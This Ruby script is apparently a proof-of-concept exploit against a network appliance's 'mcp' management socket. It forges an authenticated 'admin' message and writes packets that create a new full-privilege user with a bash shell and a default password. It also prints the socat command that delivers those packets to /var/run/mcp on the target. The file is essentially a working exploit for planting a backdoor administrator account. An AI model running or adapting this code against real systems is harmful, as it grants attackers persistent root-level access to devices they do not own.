require './mcp-builder.rb'

USERNAME = ARGV[0] || 'rontest'

if ARGV[1]
  if ARGV[1] =~ /^\$[0-9]\$/
    PASSWORD = ARGV[1]
  else
    $stderr.puts "Attempting to create a crypt-sha512 hash of the password"

    # This isn't a great way to generate salt, but works for our purposes!
    SALT = (0...8).map { (0x61 + rand(26)).chr }.join
    PASSWORD = ARGV[1].crypt("$6$#{ SALT }")
  end
else
  $stderr.puts "(Using default password: `Password1`)"
  $stderr.puts

  PASSWORD = '$6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0' # "Password1"
end

$stderr.puts("Writing an `mcp` message to stdout that'll create an account: #{ USERNAME } / #{ PASSWORD }")
$stderr.puts("Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin")
$stderr.puts

print build_packet(
  build('user_authenticated', 'structure', [
    build('user_authenticated_name', 'string', 'admin')
  ])
)

print build_packet(
  build('start_transaction', 'structure', [
    build('start_transaction_load_type', 'ulong', 0)
  ])
)

print build_packet(
  build('create', 'structure', [
    build('user_role_partition', 'structure', [
      build('user_role_partition_user', 'string', USERNAME),
      build('user_role_partition_role', 'ulong',  0),
      build('user_role_partition_partition', 'string', '[All]'),
    ])
  ])
)

print build_packet(
  build('create', 'structure', [
    build('userdb_entry', 'structure', [
      build('userdb_entry_name',         'string', USERNAME),
      build('userdb_entry_partition_id', 'string', 'Common'),
      build('userdb_entry_is_system',    'ulong',  0),
      build('userdb_entry_shell',        'string', '/bin/bash'),
      # build('userdb_entry_passwd',       'string', 'test'), # "test"
      # build('userdb_entry_is_crypted',   'ulong',  0),
      build('userdb_entry_is_crypted',   'ulong',  1),
      build('userdb_entry_passwd',       'string', PASSWORD), # "test"
      # build('userdb_entry_description',  'string', ''),
    ])
  ])
)

print build_packet(
  build('end_transaction', 'structure', [])
)
